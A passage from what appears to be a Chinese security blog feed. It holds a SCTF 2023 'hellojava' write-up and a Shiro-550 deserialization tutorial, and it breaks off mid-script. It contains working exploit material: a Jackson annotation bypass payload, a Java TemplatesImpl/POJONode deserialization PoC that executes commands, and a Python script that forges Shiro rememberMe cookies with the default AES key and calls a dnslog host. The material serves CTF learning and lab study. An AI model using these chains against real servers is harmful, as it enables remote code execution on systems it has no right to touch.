</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230622004425446.png" alt="image-20230622004425446"></p><p><strong>这吊题真难</strong></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>题目就给了一个jar包   进行反编译查看</p><p><img src="../images/image-20230622195938811.png" alt="image-20230622195938811"></p><p><strong>这时jar包里的内容    还给了一个  <code>1.jar</code>   里面含有这个javassist  说明可以使用<code>templatesimpl</code></strong></p><p><img src="../images/image-20230622200111030.png" alt="image-20230622200111030"></p><p><strong>看了一下<code>pom.xml</code></strong></p><p>发现一共给了三种依赖</p><ul><li>scala    2.13.7</li><li>jackson</li><li>hessian     4.0.4</li></ul><p>一般来说就先对这个<code>pom.xml</code>的依赖进行分析  发现<code>scala</code>这个版本是存在漏洞的</p><p><img src="../images/image-20230622202022788.png" alt="image-20230622202022788"></p><p><img src="../images/image-20230622202525933.png" alt="image-20230622202525933"></p><p>找到了反序列化入口   那么关键点就是如何进入这个if判断了</p><p><img src="../images/image-20230622204854853.png" alt="image-20230622204854853"></p><p><img src="../images/image-20230622204904698.png" alt="image-20230622204904698"></p><p>这个东西要为true才行  但是如果简单的这样传值的话</p><p><code>&#123;&quot;IfInput&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code>  这样简单的传值的话是不行的</p><p><img src="../images/image-20230622205042591.png" alt="image-20230622205042591"></p><p>关键词搜索  <a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">Jackson注解的一个trick</a>   发现了这篇文章就是讲这个的</p><p><strong>使用空值就可以进行绕过了</strong></p><p><code>&#123;&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code></p><p>接下来就到如何进行反序列化利用了</p><p><img src="../images/image-20230622205655871.png" alt="image-20230622205655871"></p><p>结合这个<code>LazyList</code>东西和刚开始分析的<code>scala</code>漏洞的内容   可以猜测用这个反序列化来清空黑名单过滤</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a>   用这个代码  然后直接打就行了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code> 生成 Base64 payload</p><p><img src="../images/image-20230622213852125.png" alt="image-20230622213852125"></p><p>发包来打  将 <code>security/blacklist.txt</code> 清空</p><p>之后再使用 jackson 利用链，可以裸反序列化 RCE </p><p><img src="../images/image-20230622213955923.png" alt="image-20230622213955923"></p><p>最终<strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//serial(exp);</span></span><br><span class="line">        <span class="comment">//serialize(exp);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        HttpHeaders requestHeaders = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>不知道为啥  这里我只能用这种形式的poc才能弹计算器    如果用<code>xx.class</code>这种形式的poc的话  是弹不出计算器的。。。。。。。</strong>)</p><p>这里注意的一点就是  新建项目的时候</p><p><img src="../images/image-20230624210123241.png" alt="image-20230624210123241"><em>**</em></p><p>得把<code>BaseJsonNode</code>里的这个东西给注释掉</p><p><strong>不然会报错</strong></p><p>这其实不是预期解  </p><p><img src="../images/image-20230624210304228.png" alt="image-20230624210304228"></p><p>预期解是打这个<code>hessian</code>这条链子</p><p><strong>官方wp是这样说的</strong></p><p><img src="../images/image-20230624210928869.png" alt="image-20230624210928869"></p><h2 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h2><p><strong>描述</strong></p><p><img src="../images/image-20230624212738790.png" alt="image-20230624212738790"></p><p>没环境   看官方wp有个思路就行了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezcheck1n&quot;&gt;&lt;a href=&quot;#ezcheck1n&quot; class=&quot;headerlink&quot; title=&quot;ezcheck1n&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezcheck1n&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="sctf-web-2023" scheme="https://ke1nys.github.io/tags/sctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-shiro</title>
    <link href="https://ke1nys.github.io/posts/55797267.html"/>
    <id>https://ke1nys.github.io/posts/55797267.html</id>
    <published>2023-06-19T08:49:08.000Z</published>
    <updated>2023-06-21T08:41:22.399Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7133959651653058574">参考文章1</a>     <a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频 </a>  <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p>(<strong>主要看参考文章2</strong>)</p><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DApache%26spm%3D1001.2101.3001.7020">Apache</a> Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能，Shiro框架直观、易用、同时也能提供健壮的安全性。</p><p>Apache Shiro<a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%26spm%3D1001.2101.3001.7020">反序列化</a>漏洞分为两种：<strong>Shiro-550</strong>、<strong>Shiro-721</strong></p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt; 1.2.4</p><h3 id="Shiro反序列化的特征"><a href="#Shiro反序列化的特征" class="headerlink" title="Shiro反序列化的特征"></a>Shiro反序列化的特征</h3><p>返回包中会包含rememberMe=deleteMe字段</p><p>这种情况大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，这个是在返回包中(Response)</p><p>如果返回的数据包中没有remeberMe=deleteMe字段的话，可以在数据包中的Cookie中添加remeberMe=deleteMe字段这样也会在返回包中有这个字段</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里用的P神给的环境 ：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ul><li>JDK 8u65</li><li>Tomcat 9</li><li>Shiro 1.2.4</li><li>Commons Collection 3.2.1</li></ul><p>先把p神的项目下载下来</p><p><img src="../images/image-20230619172524775.png" alt="image-20230619172524775"></p><p>然后用<code>idea</code>打开<code>shirodemo</code></p><p><img src="../images/image-20230619172551611.png" alt="image-20230619172551611"></p><p>接着就是配置<code>tomacat</code>了</p><p><img src="../images/image-20230619172643791.png" alt="image-20230619172643791"></p><p>先去官网把他下载下来</p><p>然后进入idea打开设置</p><p><img src="../images/image-20230619172728851.png" alt="image-20230619172728851"></p><p><img src="../images/image-20230619172749282.png" alt="image-20230619172749282"></p><p>添加tomacat的路径</p><p><img src="../images/image-20230619172816282.png" alt="image-20230619172816282"></p><p>接着点击这个</p><p><img src="../images/image-20230619172838144.png" alt="image-20230619172838144"></p><p>先配置这个</p><p><img src="../images/image-20230619172854359.png" alt="image-20230619172854359"></p><p>最后就完成了</p><p><img src="../images/image-20230619172911210.png" alt="image-20230619172911210"></p><h3 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h3><p>先抓个包看看  </p><p>默认账号密码</p><ul><li>root</li><li>secret</li></ul><p><strong>(重点是得勾选这个<code>remember me</code>)</strong></p><p><img src="../images/image-20230619173801606.png" alt="image-20230619173801606"></p><p><strong>固定会返回这个<code>rememberMe=deleteMe</code></strong></p><p>并且这个<code>cookie</code>很长(<strong>这就说明了这个cookie存着一些信息</strong>)</p><p>我们就去代码里找一下看这个<code>cookie</code>是怎么生成的</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p><strong>在登录成功后会对cookie进行编码加密 ，我们来跟一下这个加密流程</strong></p><p>入口是在 <code>AbstractRememberMeManager.onSuccessfulLogin</code> 方法</p><p><img src="../images/image-20230619175908159.png" alt="image-20230619175908159"></p><p>判断 token 是否为 true，然后调用 <code>rememberIdentity</code>：</p><p><img src="../images/image-20230619180002676.png" alt="image-20230619180002676"></p><p>看一下这个 <code>getIdentityToRemember</code>：</p><p><img src="../images/image-20230619180033277.png" alt="image-20230619180033277"></p><p>大致就是获取用户名赋值给 <code>principals</code>。</p><p>回到<code>rememberIdentity</code>跟进<code>this.rememberIdentity(subject, principals)</code>：</p><p><img src="../images/image-20230619180132520.png" alt="image-20230619180132520"></p><p>跟进 <code>convertPrincipalsToBytes</code> 看看：</p><p><img src="../images/image-20230619180150004.png" alt="image-20230619180150004"></p><p>先对用户名进行序列化处理，然后调用了个<code>this.getCipherService()</code>方法是否有返回值，跟进查看：</p><p><img src="../images/image-20230619180226872.png" alt="image-20230619180226872"></p><p>返回了一种 AES 的加密方式CBC。</p><p>回到<code>convertPrincipalsToBytes</code>方法，接着调用<code>this.encrypt(bytes)</code>对序列化后的用户名进行加密操作，跟进：</p><p><img src="../images/image-20230619180301097.png" alt="image-20230619180301097"></p><p>这里同样是先用<code>getCipherService</code>方法获取一个加密方式，如果不是空则用该加密方式调用<code>encrypt</code>方法进行加密，AES加密是个对称加密需要密钥，所以这里用<code>getEncryptionCipherKey</code>获取一个密钥，跟进看看：</p><p><img src="../images/image-20230619180347089.png" alt="image-20230619180347089"></p><p>看来是直接返回了这个密钥，由于我们知道这个漏洞就是因为密钥是硬编码写好的造成的，所以我们往回找找这个密钥是哪里赋值的。</p><p>找到这个AbstractRememberMeManager类初始化的时候会，调用<code>setCipherKey</code>方法来设置密钥：</p><p><img src="../images/image-20230619180422223.png" alt="image-20230619180422223"></p><p>跟进<code>setCipherKey</code>方法瞧一眼：</p><p><strong><img src="../images/image-20230619180444210.png" alt="image-20230619180444210"></strong></p><p>正如上面说的AES是对称加密，加密和解密的密钥是同一个，这里就是用传进来的密钥分别赋值给加密密钥和解密密钥，跟进<code>setEncryptionCipherKey</code>：</p><p><img src="../images/image-20230619180515710.png" alt="image-20230619180515710"></p><p>这里就是直接赋值了（吐槽下，真套呀，不过还能看得懂，没套晕）</p><p>回到AbstractRememberMeManager类初始化的<code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code>这里，这里传入的静态变量DEFAULT_CIPHER_KEY_BYTES实在类定义里面写好的：</p><p><img src="../images/image-20230619180524282.png" alt="image-20230619180524282"></p><p>就是说这个 <code>encryptionCipherKey</code> 是 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 的解密，是一个常量 就是说让用户名的序列化和一个常量进入 <code>cipherService.encrypt</code> 进行加密：</p><p><img src="../images/image-20230619180616452.png" alt="image-20230619180616452"></p><p>具体加密就不看了，不懂密码学。</p><p>总之对学列化后的用户名进行AES加密之后会返回字节到<code>rememberIdentity</code>方法：</p><p><img src="../images/image-20230619180706415.png" alt="image-20230619180706415"></p><p>进入下一步的<code>rememberSerializedIdentity</code>方法：</p><p><img src="../images/image-20230619181422498.png" alt="image-20230619181422498"></p><p>刚才都还是在AbstractRememberMeManager类里面调用，这时候就来到了CookieRememberMeManager类里面，看类名大概能猜到是处理cookie的了。</p><p>这里逻辑就是对传进来的字节进行base64加密，然后设置为名字为rememberMe的cookie值。(<strong>根据这个函数名得知，这里是会对cookie进行序列化处理的</strong>)</p><h3 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h3><p>现在我们从<code>getRememberedIdentity</code>开始分析，文件位置 <code>org/apache/shiro/mgt/DefaultSecurityManager.java</code></p><p><img src="../images/image-20230619182115535.png" alt="image-20230619182115535"></p><p>跟进到<code>getRememberedPrincipals</code>：</p><p><img src="../images/image-20230619182143104.png" alt="image-20230619182143104"></p><p>继续跟到<code>getRememberedSerializedIdentity</code>：</p><p><img src="../images/image-20230619182230245.png" alt="image-20230619182230245"></p><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>返回 <code>getRememberedPrincipals</code>方法，下一步跟进 <code>convertBytesToPrincipals</code>方法：</p><p><img src="../images/image-20230619182456872.png" alt="image-20230619182456872"></p><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>。解密就是和加密的逆过程，不多说，进入 <code>deserialize</code>：</p><p><img src="../images/image-20230619182549894.png" alt="image-20230619182549894"></p><p>继续跟进套娃的<code>deserialize</code>：</p><p><img src="../images/image-20230619182713824.png" alt="image-20230619182713824"></p><p>发现<code>readObject</code>方法出现了，下面就可以愉快地进行反序列化了！</p><p><strong>加密解密跟解密都跟完了</strong>  </p><p>(<strong>如果我们能根据这个固定密钥来伪造cookie的话，这样的话就可以进行恶意操作了</strong>)</p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？文章<a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>因此我们需要构造payload<strong>排除类型转换错误</strong>，进而准确判断密钥。</p><p>shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p><a href="https://www.cnblogs.com/zpchcbd/p/15092263.html">可测试key是否正确</a></p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>通过漏洞原理可以知道，构造Payload需要将利用链通过AES加密后在base64编码。将Payload的值设置为rememberMe的cookie值，这里借助ysoserial中的URLDNS链去打，<strong>由于URLDNS不依赖于Commons Collections包，只需要JDK的包就行，所有一半用于检测是否存在漏洞</strong>。</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">r&#x27;D:\Program Files\Java\jdk1.8.0_301\bin\java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">r&#x27;F:\CTF资料\CTF工具\ysoserial\target\ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog</span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://dq6w3y.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span 